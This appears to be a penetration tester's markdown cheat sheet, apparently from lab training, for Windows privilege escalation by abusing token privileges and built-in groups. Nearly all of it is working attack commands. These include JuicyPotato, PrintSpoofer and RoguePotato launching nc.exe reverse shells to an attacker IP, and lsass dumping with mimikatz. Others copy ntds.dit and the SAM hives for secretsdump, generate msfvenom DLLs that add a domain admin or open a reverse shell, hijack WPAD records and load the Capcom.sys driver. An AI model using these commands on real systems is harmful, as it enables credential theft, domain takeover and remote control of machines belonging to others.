#  SeImpersonate
```
xp_cmdshell whoami /priv
```
### Example
```
PRIVILEGES INFORMATION                                                             

----------------------                                                             

NULL                                                                               

Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   

SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   

SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    

SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    

SeImpersonatePrivilege        Impersonate a client after authentication Enabled    

SeCreateGlobalPrivilege       Create global objects                     Enabled    

SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled 
```
To escalate privileges using these rights, let's first download the exploit binary and upload this and nc.exe to the target server. Next, stand up a Netcat listener on port 8443, and execute the command below where -l is the COM server listening port, -p is the program to launch (cmd.exe), -a is the argument passed to cmd.exe, and -t is the createprocess call. Below, we are telling the tool to try both the CreateProcessWithTokenW and CreateProcessAsUser functions, which need SeImpersonate or SeAssignPrimaryToken privileges respectively.
## JuicyPotato
https://github.com/ohpe/juicy-potato

```
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.214 8443 -e cmd.exe" -t *
```
JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. 
## PrintSpoofer
https://github.com/itm4n/PrintSpoofer

https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/
```
c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.214 8443 -e cmd"
```
## Rogue Potato
https://github.com/antonioCoco/RoguePotato
```
xp_cmdshell c:\tools\RoguePotato\RoguePotato.exe -r 10.10.14.214 -e "c:\tools\nc.exe 10.10.14.214 8443 -e cmd"
```
# SeDebugPrivilege
Verify permissions in cmd with admin
```
C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```
## Procdump
```
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
or
![image](https://user-images.githubusercontent.com/128841823/232630604-454078d5-aa14-4f0b-8843-c3b1b1bd163e.png)

transfer or direct mimikats to the lsass.dmp

## Mimikats
```
mimikatz.exe
```
```
mimikatz # log
```
```
sekurlsa::minidump lsass.dmp
```
```
sekurlsa::logonpasswords
```
also

https://decoder.cloud/2018/02/02/getting-system/

# SeTakeOwnershipPrivilege
This privilege assigns WRITE_OWNER rights over an object
### Example of privs
```
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
```
```
import-module .\EnableAllTokenPrivs.ps1
```
```
.\EnableAllTokenPrivs.ps1
```
```
PS C:\tools> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
```
### Choosing a target file
```
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```
### Checking File Ownership
```
cmd /c dir /q 'C:\Department Shares\Private\IT'
```
### Taking Ownership of the File
```
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```
### Verify Ownership
```
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
```
### Grant user full privileges over the target file
```
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```
### Viewing the file
```
cat 'C:\Department Shares\Private\IT\cred.txt'
```
### Files of interest
```
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```
# Windows Built-in Groups
Default groups

https://ss64.com/nt/syntax-security_groups.html
```
whoami /priv
```
Import the modules
```
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
Verify privs
```
whoami /priv
```
```
Copy-FileSeBackupPrivilege 'c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt' .\flag.txt
```
```
cat .\flag.txt
```
## Copying NTDS.dit
```
diskshadow.exe
```
```
DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```
```
 Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\tools\dump\ntds.dit
```
## Backing up SAM and SYSTEM Registry Hives
The privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline using a tool such as Impacket's secretsdump.py

run cmd.exe as admin
```
reg save HKLM\SYSTEM SYSTEM.SAV
```
```
reg save HKLM\SAM SAM.SAV
```
It's worth noting that if a folder or file has an explicit deny entry for our current user or a group they belong to, this will prevent us from accessing it, even if the FILE_FLAG_BACKUP_SEMANTICS flag is specified.
## Extracting Credentials from NTDS.dit
```
Import-Module .\DSInternals.psd1
```
```
$key = Get-BootKey -SystemHivePath .\SYSTEM
```
```
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```
or transfer the 
files we dumped to the attack box and run secretsdump
```
impacket-secretsdump local -system SYSTEM -ntds ntds.dit
```
## Using Robocopy to transfer files
```
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```
# Event Log Readers
## Confirming Group Membership
```
net localgroup "Event Log Readers"
```
## Searching Security Logs using webtutil
```
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```
## Passing Credientials to wevtutil
```
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```
## Searching Security Logs Using Get-WinEvent
```
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```
The cmdlet can also be run as another user with the -Credential parameter.
# DNS Admins
## Leveraging DnsAdmins Access
```
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```
```
sudo python3 -m http.server 7777
```
From clients powershell
```
wget "http://10.10.14.214:7777/adduser.dll" -outfile "adduser.dll"
```
From clients CMD
```
dnscmd.exe /config /serverlevelplugindll C:\tools\adduser.dll
```
if denied execute this in powershell
```
Get-ADGroupMember -Identity DnsAdmins
```
### Finding Users SID
```
wmic useraccount where name="netadm" get sid
```
### Checking Permissions on DNS Service
```
sc.exe sdshow DNS
```
### Stop and Start DNS Services
```
sc stop dns
sc start dns
```

### Confirming Group Membership
```
net group "Domain Admins" /dom
```
https://medium.com/@parvezahmad90/windows-privilege-escalation-dns-admin-to-nt-authority-system-step-by-step-945fe2a094dc

For a reverseshell use this payload
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.214 LPORT=4444 --platform windows -f dll > netsec.dll
```
## Mimilib
http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html

## Creating a WPAD Record
```
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```
```
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```
Then use inveigh or responder

# Print Operators
Run CMD as Admin
### Required tools
```
EnableSeLoadDriverPrivilege.cpp
Capcom.sys driver 
```
## Add Reference to Drive
```
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
```
```
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```
## Verify the driver is not loaded
```
.\DriverView.exe /stext drivers.txt
```
```
cat drivers.txt | Select-String -pattern Capcom
```
## Verify Privledge is enabled
```
EnableSeLoadDriverPrivilege.exe
```
## Verify the driver
```
.\DriverView.exe /stext drivers.txt
```
```
cat drivers.txt | Select-String -pattern Capcom
```
## Used ExploitCapcom Tool to escalate privileges
```
.\ExploitCapcom.exe
```
## Automating the Steps with EoPLoadDriver.exe
```
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```
## Used ExploitCapcom Tool to escalate privileges
```
.\ExploitCapcom.exe
```

